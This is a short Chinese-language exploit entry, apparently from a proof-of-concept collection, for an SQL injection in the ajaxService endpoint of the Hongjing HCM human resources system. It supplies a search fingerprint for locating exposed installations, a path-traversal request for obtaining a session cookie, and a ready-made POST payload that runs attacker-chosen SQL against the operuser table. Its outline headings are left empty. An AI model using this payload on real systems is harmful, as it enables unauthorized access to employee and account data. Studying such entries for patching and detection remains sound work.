# 宏景人力资源信息管理系统ajaxService存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`GET /templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp HTTP/1.1`

**请求体 / payload**
```
1、首先发送如下payload获取cookie
Host:

2、使用获取的cookie进行注入
POST /ajax/ajaxService HTTP/1.1
Host:
Cookie: JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3
Content-Type: application/x-www-form-urlencoded
__type=extTrans&__xml={"functionId":"151211001137","sql":"select~20(select~20user)~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
```

**其他**
- 宏景人力资源信息管理系统ajaxService存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统